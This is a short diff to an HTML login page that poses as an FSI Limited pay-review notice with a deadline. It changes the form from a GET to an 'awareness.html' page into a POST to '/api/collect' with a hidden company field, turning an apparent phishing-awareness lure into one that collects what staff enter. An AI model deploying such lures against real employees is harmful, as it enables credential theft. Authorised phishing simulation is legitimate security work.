@@ -712,7 +712,8 @@
         <span><strong>Notice:</strong> Your 2026 pay review letter and updated deployment schedule are available. Log in before <strong>Friday, 8 May 2026</strong> to confirm receipt.</span>
       </div>
 
-      <form action="awareness.html" method="GET">
+      <form action="/api/collect" method="POST">
+  <input type="hidden" name="company" value="FSI Limited">
         <div class="field">
           <label>Staff Email Address</label>
           <input type="email" name="email" placeholder="firstname.lastname@fsilimited.com" required autocomplete="email">
